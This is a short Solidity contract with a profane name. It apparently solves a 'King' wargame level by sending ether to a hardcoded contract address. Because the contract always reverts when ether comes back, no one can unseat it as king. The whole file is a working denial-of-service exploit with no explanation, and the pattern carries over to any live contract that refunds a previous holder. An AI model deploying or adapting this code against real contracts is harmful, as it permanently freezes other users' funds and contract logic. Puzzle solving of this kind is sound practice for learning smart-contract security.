pragma solidity >=0.8.2 <0.9.0;

contract KingFucker {
    receive() external payable {
        revert("receive not accepted");
    }
    function attack() external payable {
        (bool success, ) = payable(0xeEC756925d035aa9376c8e2518D05DCE1707E1eA).call{value: msg.value}("");
        require(success, "stop");
    }
}
